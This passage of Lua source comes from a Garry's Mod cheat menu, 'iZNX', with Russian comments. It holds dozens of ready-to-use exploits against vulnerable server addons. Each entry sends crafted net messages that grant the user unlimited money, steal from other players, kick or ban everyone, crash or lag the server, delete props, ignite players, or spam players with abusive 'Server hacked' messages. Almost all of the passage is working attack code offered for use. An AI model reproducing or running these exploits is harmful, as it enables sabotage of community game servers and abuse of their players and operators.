net.WriteString("The addons leaks is full of feat :D")
net.SendToServer()
end, },
{ typ = "func", name = "Супер спам", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "taxispam" ) then
iZNX.ChatText( "Спам спавном такси запущен" )
timer.Create( "taxispam", 0.05, 0, function()
local Pos = LocalPlayer():GetEyeTrace().HitPos
iZNX.NetStart("Taxi_Add")
net.WriteString("Taxi Super Exploit #"..math.random( 1, 9999 ))
net.WriteTable({[1]=Pos.x,[2]=Pos.y,[3]=Pos.z})
net.WriteFloat(-9999999)
net.WriteString("The addons leaks is full of feat :D")
net.SendToServer()
end)
else
timer.Remove( "taxispam" )
iZNX.ChatText( "Спам спавном такси прекращен" )
end
end, },
},
} )
iZNX.AddExploit( "€ eMining €", {
desc = "Exploit на деньги ;)",
severity = 4,
scan = function() return iZNX.ValidNetString( "SellMinerals" ) end,
functions = {
{ typ = "float", name = "Сумма", min = "1", max = "100000000", default = "100000", addr = "montant_argent6" },
{ typ = "func", name = "Получить", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
for k,v in pairs(SkillDB) do
if not ( v.iSkill == true ) then
iZNX.NetStart("Upgrade")
net.WriteTable( { LuaName = v.LuaName, Amount = -iZNX.GetStored( "montant_argent6" ) } )
net.SendToServer()
iZNX.NetStart( "SellMinerals" )
net.WriteTable( { Target = LocalPlayer() } )
net.SendToServer()
end
end
end, },
{ typ = "func", name = "Снять", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
for k,v in pairs(SkillDB) do
if not ( v.iSkill == true ) then
iZNX.NetStart("Upgrade")
net.WriteTable( { LuaName = v.LuaName, Amount = iZNX.GetStored( "montant_argent6" ) } )
net.SendToServer()
iZNX.NetStart( "SellMinerals" )
net.WriteTable( { Target = LocalPlayer() } )
net.SendToServer()
end
end
end, },
},
} )
iZNX.AddExploit( "€ Gamble NPC €", {
desc = "Exploit на бессконечные деньги, купим шлюх и кокс ;)",
severity = 4,
scan = function() return iZNX.ValidNetString( "TakeBetMoney" ) end,
functions = {
{ typ = "func", name = "Получить", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart( "TakeBetMoney" )
net.WriteTable({1e333333 , 1e333333})
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "€ Kun Oil Mod €", {
desc = "Exploit на деньги, купим шлюх и кокс ;)",
severity = 3,
scan = function() return iZNX.ValidNetString( "Kun_SellOil" ) end,
functions = {
{ typ = "func", name = "Получить", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
for k,v in pairs(ents.GetAll()) do
iZNX.NetStart("Kun_SellOil")
net.WriteEntity(v)
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "Join the Police 1", {
desc = "Вступление в полицию, не одевая эту гребаную форму",
severity = 2,
scan = function() return iZNX.ValidNetString( "PoliceJoin" ) end,
functions = {
{ typ = "func", name = "Вступить", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart("PoliceJoin")
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "Join the Police 2", {
desc = "Вступление в полицию, не одевая эту гребаную форму",
severity = 2,
scan = function() return iZNX.ValidNetString( "CpForm_Answers" ) end,
functions = {
{ typ = "func", name = "Вступить", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart("CpForm_Answers")
net.WriteEntity(LocalPlayer())
net.WriteTable({})
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "€ Deposit Money €", {
desc = "Exploit на деньги с ATM банкоматом",
severity = 2,
scan = function() return iZNX.ValidNetString( "DepositMoney" ) end,
functions = {
{ typ = "float", name = "Сумма", min = "1", max = "100000000", default = "100000", addr = "montant_argent7" },
{ typ = "func", name = "Запуск", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
for k,v in pairs(ents.GetAll()) do
swag = v
end
for k,v in pairs(player.GetAll()) do
iZNX.NetStart( "DepositMoney" )
net.WriteEntity(swag)
net.WriteString(-iZNX.GetStored( "montant_argent7" ))
net.WriteEntity(v)
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "MDE", {
desc = "Exploit для удаления PermaProps (Наведите на проп и нажмите на кнопку, чтобы удалить его)",
severity = 2,
scan = function() return iZNX.ValidNetString( "MDE_RemoveStuff_C2S" ) end,
functions = {
{ typ = "func", name = "Удалить", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart( "MDE_RemoveStuff_C2S" )
net.WriteTable( {DATA="",TARGET=LocalPlayer():GetEyeTrace().Entity} )
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "€ SS Shelf NET €", {
desc = "Exploit на деньги",
severity = 3,
scan = function() return iZNX.ValidNetString( "NET_SS_DoBuyTakeoff" ) end,
functions = {
{ typ = "float", name = "Сумма", min = "1", max = "100000000", default = "100000", addr = "montant_argent9" },
{ typ = "func", name = "Получить", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
for k,v in pairs(ents.GetAll()) do
swag = v
end
iZNX.NetStart( 'NET_SS_DoBuyTakeoff' )
net.WriteEntity(LocalPlayer())
net.WriteEntity(swag)
net.WriteTable({'spawned_weapon'})
net.WriteInt(-iZNX.GetStored( "montant_argent9" ), 16)
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "€ MODIFIER TAXES €", {
desc = "Exploit на деньги",
severity = 3,
scan = function() return iZNX.ValidNetString( "NET_EcSetTax" ) end,
functions = {
{ typ = "float", name = "Сумма", min = "1", max = "100000000", default = "100000", addr = "montant_argent10" },
{ typ = "func", name = "Получить", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart("NET_EcSetTax")
net.WriteInt(-iZNX.GetStored( "montant_argent10" ), 16)
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "€ Fine System €", {
desc = "Exploit на деньги, купим шлюх и кокс ;)",
severity = 3,
scan = function() return iZNX.ValidNetString( "RP_Accept_Fine" ) end,
functions = {
{ typ = "float", name = "Сумма", min = "1", max = "100000000", default = "100000", addr = "montant_argent11" },
{ typ = "players", addr = "l_players_listing_fine" },
{ typ = "func", name = "Получить", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
local t = iZNX.GetStored( "l_players_listing_fine", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart("RP_Accept_Fine")
net.WriteString(v:Nick())
net.WriteDouble(-iZNX.GetStored( "montant_argent11" ))
net.SendToServer()
end
end, },
{ typ = "func", name = "Отправить всем", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
local t = iZNX.GetStored( "l_players_listing_fine", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart("RP_Fine_Player")
net.WriteString(v:Nick())
net.WriteString(v:Nick())
net.WriteDouble(iZNX.GetStored( "montant_argent11" ))
net.WriteString("This server deserves anarchy! Server hacked !! You can lick my asshole now x)")
net.SendToServer()
end
end, },
{ typ = "func", name = "Spam send Fine", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "spamamandefine" ) then
iZNX.ChatText( "Начинаем спам" )
timer.Create( "spamamandefine", 0.1, 0, function()
local t = iZNX.GetStored( "l_players_listing_fine", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart("RP_Fine_Player")
net.WriteString(v:Nick())
net.WriteString(v:Nick())
net.WriteDouble(iZNX.GetStored( "montant_argent11" ))
net.WriteString("This server deserves anarchy! Server hacked !! You can lick my asshole now")
net.SendToServer()
end
end)
else
timer.Remove( "spamamandefine" )
iZNX.ChatText( "Прекращаем спам" )
end
end, },
},
} )
iZNX.AddExploit( "€ 3D Cardealer €", {
desc = "Exploit на деньги, Смотрите на купленный автомобиль, чтобы дублировать его ;)",
severity = 2,
scan = function() return iZNX.ValidNetString( "RXCAR_Shop_Store_C2S" ) end,
functions = {
{ typ = "func", name = "Дублировать", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
for i = 0, 75 do
iZNX.NetStart( "RXCAR_Shop_Store_C2S" );
net.WriteTable( { E = ent } );
net.SendToServer();
end
end, },
{ typ = "func", name = "Продать все", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
local ent
for k,v in pairs(ents.GetAll()) do
if v:GetClass() == "rm_car_dealer" then
ent = v
end
end
for k,v in pairs(RX3DCar_Inventory) do
iZNX.NetStart( "RXCAR_SellINVCar_C2S" )
net.WriteTable({UN=v.UniqueID,SE=ent})
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "Remove Weapons / Money", {
desc = "Удалить оружие / деньги у всех",
severity = 3,
scan = function() return iZNX.ValidNetString( "drugseffect_remove" ) end,
functions = {
{ typ = "func", name = "Удалить оружие", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart("drugseffect_remove")
net.SendToServer()
end, },
{ typ = "func", name = "Удалить деньги", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart("drugs_money")
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "€ Crafting Mod €", {
desc = "Exploit на деньги",
severity = 3,
scan = function() return iZNX.ValidNetString( "CRAFTINGMOD_SHOP" ) end,
functions = {
{ typ = "float", name = "Сумма", min = "1", max = "100000000", default = "100000", addr = "montant_argent14" },
{ typ = "func", name = "Добавить денег", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart("CRAFTINGMOD_SHOP")
net.WriteTable({
BUY =   -iZNX.GetStored( "montant_argent14" );
type    =   1
})
net.WriteInt(1,16)
net.SendToServer()
end, },
{ typ = "func", name = "Удалить деньги", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart("CRAFTINGMOD_SHOP")
net.WriteTable({
BUY =   LocalPlayer():getDarkRPVar("money");
type    =   1
})
net.WriteInt(1,16)
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "Set on FIRE", {
desc = "Подожгите пропы / игроков. RIP JOHNNY.",
severity = 3,
scan = function() return iZNX.ValidNetString( "drugs_ignite" ) end,
functions = {
{ typ = "func", name = "Поджечь пропы", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart("drugs_ignite")
net.WriteString("prop_physics")
net.SendToServer()
end, },
{ typ = "func", name = "Поджечь игроков", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart("drugs_ignite")
net.WriteString("player")
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "Change HP", {
desc = "Измените HP игроков",
severity = 2,
scan = function() return iZNX.ValidNetString( "drugseffect_hpremove" ) end,
functions = {
{ typ = "float", name = "Сумма", min = "1", max = "100000000", default = "100", addr = "montant_argent15" },
{ typ = "func", name = "Сетнуть HP", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart("drugseffect_hpremove")
net.WriteString(iZNX.GetStored( "montant_argent15" ))
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "Respawn Exploit", {
desc = "Exploit на возрождение",
severity = 2,
scan = function() return iZNX.ValidNetString( "DarkRP_Kun_ForceSpawn" ) end,
functions = {
{ typ = "func", name = "Телепорт", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart("DarkRP_Kun_ForceSpawn")
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "Удалить проп 2", {
desc = "Удаление всех пропов",
severity = 2,
scan = function() return iZNX.ValidNetString( "drugs_text" ) end,
functions = {
{ typ = "func", name = "Удалить", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart("drugs_text")
net.WriteString("prop_physics")
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "Kick 3", {
desc = "Exploit для кика всех людей",
severity = 3,
scan = function() return iZNX.ValidNetString( "NLRKick" ) end,
functions = {
{ typ = "players", addr = "l_players_listing515" },
{ typ = "func", name = "Кик", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
local t = iZNX.GetStored( "l_players_listing515", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart("NLRKick")
net.WriteEntity(v)
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "Kick 2", {
desc = "Exploit для кика",
severity = 3,
scan = function() return iZNX.ValidNetString( "RecKickAFKer" ) end,
functions = {
{ typ = "players", addr = "l_players_listing2545" },
{ typ = "func", name = "Кик", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
local t = iZNX.GetStored( "l_players_listing2545", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart("RecKickAFKer")
net.WriteEntity(v)
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "Loot Items", {
desc = "Auto-Loot предметов",
severity = 2,
scan = function() return iZNX.ValidNetString( "GMBG:PickupItem" ) end,
functions = {
{ typ = "func", name = "Лут", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
for k, v in pairs(ents.GetAll()) do
if v:GetClass() == "item_loot" then
iZNX.NetStart("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
iZNX.NetStart("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
iZNX.NetStart("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
iZNX.NetStart("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
iZNX.NetStart("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
iZNX.NetStart("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
end
end
end, },
},
} )
iZNX.AddExploit( "Kick everyone", {
desc = "Exploit для кика всх людей",
severity = 3,
scan = function() return iZNX.ValidNetString( "DL_Answering" ) end,
functions = {
{ typ = "func", name = "Кик", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "kickallnoob" ) then
iZNX.ChatText( "Кик всех запущен" )
timer.Create( "kickallnoob", 0.05, 0, function()
for i = 1, 2000 do
iZNX.NetStart("DL_Answering")
net.SendToServer()
end
end)
else
timer.Remove( "kickallnoob" )
iZNX.ChatText( "Кик всех прекращен" )
end
end, },
},
} )
iZNX.AddExploit( "Kick 1", {
desc = "Exploit для кика админов",
severity = 3,
scan = function() return iZNX.ValidNetString( "plyWarning" ) end,
functions = {
{ typ = "players", addr = "l_players_listing255" },
{ typ = "func", name = "Кик", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
local t = iZNX.GetStored( "l_players_listing255", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart('plyWarning')
net.WriteEntity(v)
net.WriteString('You have to select a player before doing a action.')
net.SendToServer()
iZNX.ChatText("Попытка кикнуть ".. v:Nick().. "!")
end
end, },
},
} )
iZNX.AddExploit( "NLR Freeze", {
desc = "Exploit для заморозки всех людей",
severity = 3,
scan = function() return iZNX.ValidNetString( "NLR.ActionPlayer" ) end,
functions = {
{ typ = "players", addr = "l_players_listing45" },
{ typ = "func", name = "Заморозить", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
local t = iZNX.GetStored( "l_players_listing45", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart("NLR.ActionPlayer")
net.WriteEntity(v)
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "Delete props 1", {
desc = "Удаление всех пропов на сервере",
severity = 2,
scan = function() return iZNX.ValidNetString( "timebombDefuse" ) end,
functions = {
{ typ = "func", name = "Удалить", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
for k,v in pairs(ents.GetAll()) do
iZNX.NetStart("timebombDefuse")
net.WriteEntity(v)
net.WriteBool(true)
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "Hack Keypads", {
desc = "w0w h4ck3r",
severity = 1,
scan = function() return iZNX.ValidNetString( "start_wd_emp" ) end,
functions = {
{ typ = "func", name = "Хакнуть", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart("start_wd_emp")
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "€ Kart System €", {
desc = "Exploit для денег.",
severity = 3,
scan = function() return iZNX.ValidNetString( "kart_sell" ) end,
functions = {
{ typ = "func", name = "Запуск", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
for i=1, 300 do
iZNX.NetStart("kart_sell")
net.WriteString("sw_gokart")
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "€ Farming Mod €", {
desc = "Exploit для денег, купим шлюх и кокс ;)",
severity = 3,
scan = function() return iZNX.ValidNetString( "FarmingmodSellItems" ) end,
functions = {
{ typ = "float", name = "Сумма", min = "1", max = "100000000", default = "100000", addr = "montant_argent1" },
{ typ = "func", name = "Получить", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart( "FarmingmodSellItems" )
net.WriteTable(
{
Cost    =   10,
CropModel    =   "models/props/eryk/garlic.mdl",
CropType =   2,
Info  =   "Garlic Seed",
Model =   "models/props/eryk/seedbag.mdl",
Name    =   "Garlic",
Quality    =   4,
Sell  =   iZNX.GetStored( "montant_argent1" ),
Type  =   "Seed"
}
)
net.WriteInt(1,16)
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "€ Point Shop €", {
desc = "Exploit для денег, купим шлюх и кокс ;)",
severity = 3,
scan = function() return iZNX.ValidNetString( "ClickerAddToPoints" ) end,
functions = {
{ typ = "float", name = "Сумма", min = "1", max = "100000000", default = "100000", addr = "montant_argent2" },
{ typ = "func", name = "Запуск", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart("ClickerAddToPoints")
net.WriteInt(iZNX.GetStored( "montant_argent2" ), 32)
net.SendToServer()
end, },
},
} )
local PM = 1
local SK = 1
local BG = 1
local HN = 1
local TS = 1
local GL = 1
local LG = 1
iZNX.AddExploit( "Body Groups", {
desc = "Изменение скина",
severity = 1,
scan = function() return iZNX.ValidNetString( "bodyman_model_change" ) end,
functions = {
{ typ = "func", name = "Изменить", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
PlayerModels = {0,1,2,3,4,5,6}
Torso = {0,1,2,3,4,5,6,7,8,9,10}
Legs = {0,1,2,3,4,5,6}
Hands = {0,1,2}
Glasses = {0,1}
Skins = {0,1,2,3,4,5,6,7,8,9,10}
PM = PM+1
TS = TS+1
LG = LG+1
HN = HN+1
GL = GL+1
SK = SK+1
if (PM>#PlayerModels) then PM=1 end
if (SK>#Skins) then SK=1 end
if (HN>#Hands) then HN=1 end
if (TS>#Torso) then TS=1 end
if (GL>#Glasses) then GL=1 end
if (LG>#Legs) then LG=1 end
iZNX.NetStart("bodyman_model_change")
net.WriteInt(PlayerModels[PM], 10 )
net.SendToServer()
iZNX.NetStart("bodygroups_change")
net.WriteTable( { 1, Torso[TS] } )
net.SendToServer()
iZNX.NetStart("bodygroups_change")
net.WriteTable( { 2, Legs[LG] } )
net.SendToServer()
iZNX.NetStart("bodygroups_change")
net.WriteTable( { 3, Hands[HN] } )
net.SendToServer()
iZNX.NetStart("bodygroups_change")
net.WriteTable( { 4, Glasses[GL] } )
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "€ Hitman X €", {
desc = "Exploit на деньги",
severity = 3,
scan = function() return iZNX.ValidNetString( "SendMoney" ) end,
functions = {
{ typ = "float", name = "Сумма", min = "1", max = "100000000", default = "100000", addr = "montant_argent666" },
{ typ = "players", addr = "l_players_list" },
{ typ = "func", name = "Дать", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
local t = iZNX.GetStored( "l_players_list", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
hook.Remove( "HUDPaint", "skhdsakjl")
iZNX.NetStart( "SendMoney" )
net.WriteEntity( v )
net.WriteEntity( v )
net.WriteEntity( v )
net.WriteString( -iZNX.GetStored( "montant_argent666" ) )
net.SendToServer()
end
end, },
{ typ = "func", name = "Забрать", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
hook.Remove( "HUDPaint", "skhdsakjl")
local t = iZNX.GetStored( "l_players_list", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart( "SendMoney" )
net.WriteEntity( v )
net.WriteEntity( v )
net.WriteEntity( v )
net.WriteString( iZNX.GetStored( "montant_argent666" ) )
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "€ Bail Out €", {
desc = "Exploit на деньги",
severity = 3,
scan = function() return iZNX.ValidNetString( "BailOut" ) end,
functions = {
{ typ = "float", name = "Сумма", min = "1", max = "100000000", default = "100000", addr = "montant_argent16" },
{ typ = "players", addr = "l_player_liste" },
{ typ = "func", name = "Дать", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
local t = iZNX.GetStored( "l_player_liste", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart( "BailOut" )
net.WriteEntity( LocalPlayer() )
net.WriteEntity( v )
net.WriteFloat( -iZNX.GetStored( "montant_argent16" )  )
net.SendToServer()
end
end, },
{ typ = "func", name = "Забрать", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
local t = iZNX.GetStored( "l_player_liste", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart( "BailOut" )
net.WriteEntity( LocalPlayer() )
net.WriteEntity( v )
net.WriteFloat( iZNX.GetStored( "montant_argent16" )  )
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "€ Tow Truck €", {
desc = "Это перевести я не смог",
severity = 2,
scan = function() return iZNX.ValidNetString( "TOW_SubmitWarning" ) end,
functions = {
{ typ = "func", name = "Spawn МТП", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart("TowTruck_CreateTowTruck")
net.SendToServer()
end, },
{ typ = "float", name = "Сумма", min = "1", max = "100000000", default = "100000", addr = "montant_argent17" },
{ typ = "func", name = "Money Exploit", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
for k,v in pairs(ents.GetAll()) do
iZNX.NetStart("TOW_SubmitWarning")
net.WriteString(LocalPlayer():SteamID())
net.WriteDouble(-iZNX.GetStored( "montant_argent17" ))
net.WriteEntity(v)
net.SendToServer()
iZNX.NetStart("TOW_PayTheFine")
net.WriteEntity(v)
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "Fire Truck", {
desc = "Спавн Fire Truck",
severity = 1,
scan = function() return iZNX.ValidNetString( "FIRE_CreateFireTruck" ) end,
functions = {
{ typ = "func", name = "Заспавнить", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart("FIRE_CreateFireTruck")
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "€ Hit Menu €", {
desc = "Exploit на деньги",
severity = 3,
scan = function() return iZNX.ValidNetString( "hitcomplete" ) end,
functions = {
{ typ = "float", name = "Сумма", min = "1", max = "100000000", default = "100000", addr = "montant_argent18" },
{ typ = "func", name = "Получить", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart("hitcomplete")
net.WriteDouble(iZNX.GetStored( "montant_argent18" ))
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "€ HHH €", {
desc = "Exploit на деньги",
severity = 3,
scan = function() return iZNX.ValidNetString( "hhh_request" ) end,
functions = {
{ typ = "func", name = "Получить", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
local plyhhh = LocalPlayer()
for k,v in pairs(player.GetAll()) do
dahater = v
end
if dahater != plyhhh then
local hitRequest = {}
hitRequest.hitman = plyhhh
hitRequest.requester = plyhhh
hitRequest.target = dahater
hitRequest.reward = -9999999
iZNX.NetStart( 'hhh_request' )
net.WriteTable( hitRequest )
net.SendToServer()
else
iZNX.ChatText( "В этой версии HHH невозможно использовать эксплойт !" )
end
end, },
},
} )
iZNX.AddExploit( "€ DaHit €", {
desc = "Exploit на деньги",
severity = 3,
scan = function() return iZNX.ValidNetString( "DaHit" ) end,
functions = {
{ typ = "float", name = "Сумма", min = "1", max = "100000000", default = "100000", addr = "montant_argent20" },
{ typ = "players", addr = "l_players_listdahit" },
{ typ = "func", name = "Выдать", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
local t = iZNX.GetStored( "l_players_listdahit", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
hook.Remove( "HUDPaint", "skhdsakjl")
iZNX.NetStart( "DaHit" )
net.WriteFloat( -iZNX.GetStored( "montant_argent20" )  )
net.WriteEntity( v )
net.WriteEntity( v )
net.WriteEntity( v )
net.SendToServer()
end
end, },
{ typ = "func", name = "Забрать", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
local t = iZNX.GetStored( "l_players_listdahit", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
hook.Remove( "HUDPaint", "skhdsakjl")
iZNX.NetStart( "DaHit" )
net.WriteFloat( iZNX.GetStored( "montant_argent20" )  )
net.WriteEntity( v )
net.WriteEntity( v )
net.WriteEntity( v )
net.SendToServer()
end
end, },
{ typ = "func", name = "Spam выдача", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "CopySploit_exploit_spamdahitprendre" ) then
iZNX.ChatText( "Spam запущен" )
timer.Create( "CopySploit_exploit_spamdahitprendre", 1, 0, function()
local t = iZNX.GetStored( "l_players_listdahit", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
hook.Remove( "HUDPaint", "skhdsakjl")
iZNX.NetStart( "DaHit" )
net.WriteFloat( -iZNX.GetStored( "montant_argent20" )  )
net.WriteEntity( v )
net.WriteEntity( v )
net.WriteEntity( v )
net.SendToServer()
end
end)
else
timer.Remove( "CopySploit_exploit_spamdahitprendre" )
iZNX.ChatText( "Spam прекращен" )
end
end, },
{ typ = "func", name = "Spam забиранием", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "CopySploit_exploit_spamdahitenlever" ) then
iZNX.ChatText( "Spam запущен" )
timer.Create( "CopySploit_exploit_spamdahitenlever", 1, 0, function()
local t = iZNX.GetStored( "l_players_listdahit", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
hook.Remove( "HUDPaint", "skhdsakjl")
iZNX.NetStart( "DaHit" )
net.WriteFloat( iZNX.GetStored( "montant_argent20" )  )
net.WriteEntity( v )
net.WriteEntity( v )
net.WriteEntity( v )
net.SendToServer()
end
end)
else
timer.Remove( "CopySploit_exploit_spamdahitenlever" )
iZNX.ChatText( "Spam прекращен" )
end
end, },
},
} )
iZNX.AddExploit( "Anti-Printer", {
desc = "Наносите постоянный ущерб принтерам по близости",
severity = 1,
scan = function() return iZNX.ValidNetString( "customprinter_get" ) end,
functions = {
{ typ = "func", name = "Запуск", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "CopySploit_exploit_printersmasher" ) then
iZNX.ChatText( "Anti-Printer запущен" )
timer.Create( "CopySploit_exploit_printersmasher", 0, 0, function()
for k, v in pairs( ents.GetAll() ) do
if ( v:GetClass():find("print") && v:GetPos():Distance( LocalPlayer():GetPos() ) <= 750 ) then
iZNX.NetStart("customprinter_get")
net.WriteEntity(v)
net.WriteString("onoff")
net.SendToServer()
end
end
end)
else
timer.Remove( "CopySploit_exploit_printersmasher" )
iZNX.ChatText( "Anti-Printer остановлен" )
end
end, },
},
} )
iZNX.AddExploit( "Crash the Server", {
desc = "Краш сервера",
severity = 3,
scan = function() return iZNX.ValidNetString( "textstickers_entdata" ) end,
functions = {
{ typ = "func", name = "Краш", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart( "textstickers_entdata" )
net.WriteUInt( 0xFFFFFFF, 32 )
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "Free Ammunition", {
desc = "Дает вам боеприпасы для всего вашего оружия",
severity = 1,
scan = function() return iZNX.ValidNetString( "TCBBuyAmmo" ) end,
functions = {
{ typ = "func", name = "Получить", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
for k,v in pairs(GAMEMODE.AmmoTypes) do
iZNX.NetStart("TCBBuyAmmo")
net.WriteTable( {nil,v.ammoType,nil,"0","999999"} )
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "€ Advanced Money Printer €", {
desc = "Своровать все деньги из принтеров",
severity = 3,
scan = function() return iZNX.ValidNetString( "DataSend" ) end,
functions = {
{ typ = "func", name = "Своровать", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
for k, v in pairs( ents.GetAll() ) do
if v:GetClass() == "adv_moneyprinter" then
iZNX.NetStart("DataSend")
net.WriteFloat(2)
net.WriteEntity(v)
net.WriteEntity(LocalPlayer())
net.SendToServer()
end
end
end, },
},
} )
iZNX.AddExploit( "gBan Ban everyone", {
desc = "Exploit забанит всех, кроме вас. Был найден в более старой версии gBan",
severity = 3,
scan = function() return iZNX.ValidNetString( "gBan.BanBuffer" ) end,
functions = {
{ typ = "func", name = "Запуск", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
for k,v in pairs(player.GetAll()) do
if v != LocalPlayer() then
iZNX.NetStart( "gBan.BanBuffer" )
net.WriteBool( true )
net.WriteInt( 0, 32 )
net.WriteString( "Poutous everywhere" )
net.WriteString( v:SteamID() )
net.SendToServer()
end
end
end, },
},
} )
iZNX.AddExploit( "Lag Exploit #1", {
desc = "Создает лаги на сервере",
severity = 2,
scan = function() return iZNX.ValidNetString( "ATS_WARP_REMOVE_CLIENT" ) end,
functions = {
{ typ = "func", name = "Лаги", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "CopySploit_exploit_lagsploit1" ) then
iZNX.ChatText( "Запускаем лаги" )
